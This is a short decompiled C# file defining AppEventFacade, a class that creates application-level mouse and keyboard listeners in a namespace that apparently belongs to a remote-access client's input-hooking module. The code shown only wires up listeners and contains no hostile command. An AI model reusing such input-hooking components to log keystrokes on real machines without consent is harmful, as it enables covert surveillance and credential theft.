using System;

namespace xClient.Core.MouseKeyHook.Implementation
{
	// Token: 0x0200005B RID: 91
	internal class AppEventFacade : EventFacade
	{
		// Token: 0x0600026F RID: 623 RVA: 0x00003296 File Offset: 0x00001496
		protected override MouseListener CreateMouseListener()
		{
			return new AppMouseListener();
		}

		// Token: 0x06000270 RID: 624 RVA: 0x0000329D File Offset: 0x0000149D
		protected override KeyListener CreateKeyListener()
		{
			return new AppKeyListener();
		}
	}
}
